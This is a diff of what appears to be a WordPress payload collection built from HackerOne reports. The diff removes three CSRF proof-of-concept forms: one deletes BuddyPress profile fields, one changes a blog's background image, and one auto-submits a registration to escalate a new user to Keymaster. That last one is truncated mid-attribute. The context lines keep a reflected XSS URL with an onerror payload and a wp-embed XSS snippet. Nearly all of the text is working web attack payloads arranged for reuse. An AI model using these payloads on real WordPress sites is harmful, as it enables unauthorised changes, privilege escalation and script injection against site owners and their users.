@@ -1,6 +1,6 @@
 # WordPress
 
-29 payloads.
+26 payloads.
 
 ### `504008e3`
 
@@ -208,31 +208,6 @@ https://target.com/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(docu
 **Parameter:** `channel`
 — [Reflected XSS on https://target.com via 'channel' parameter](https://hackerone.com/reports/659419) · WordPress · [gnux](https://hackerone.com/gnux)
 
-### `563df193`
-
-```
-<form action="[domain]/wp-admin/users.php">
-```
-
-— [CSRF in Profile Fields allows deleting any field in BuddyPress](https://hackerone.com/reports/836187) · WordPress · [hoangkien1020](https://hackerone.com/hoangkien1020)
-
-### `5091e848`
-
-```
-<html>
-  <body>
-    <form action="https://[WP]/wp-admin/admin-ajax.php" method="POST">
-      <input type="hidden" name="attachment_id" value="5" />
-      <input type="hidden" name="action" value="set-background-image" />
-      <input type="hidden" name="size" value="thumbnail" />
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
-```
-
-— [Arbitrary change of blog's background image via CSRF](https://hackerone.com/reports/881855) · WordPress · [erwan_lr](https://hackerone.com/erwan_lr)
-
 ### `ebba0511`
 
 ```
@@ -245,26 +220,6 @@ if(document.location.hash.indexOf("secret") != -1) {
 ```
 
 — [wp-embed XSS on Safari](https://hackerone.com/reports/1238528) · WordPress · [zoczus](https://hackerone.com/zoczus)
-
-### `1bcc1533`
-
-```
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-</head>
-<body onload="document.getElementById('csrf-form').submit();">
-
-    <form id="csrf-form" action="http://localhost/victim/wp-login.php" method="POST">
-        <input type="hidden" name="user_login" value="evilpen">
-        <input type="hidden" name="user_email" value="attacker@email.com">
-        <input type="hidden" na
-```
-
-— [Pivilege escalation of any new user to Keymaster caused by CSRF](https://hackerone.com/reports/2999394) · WordPress · [br3n](https://hackerone.com/br3n)
 
 ### `6d810f40`
 
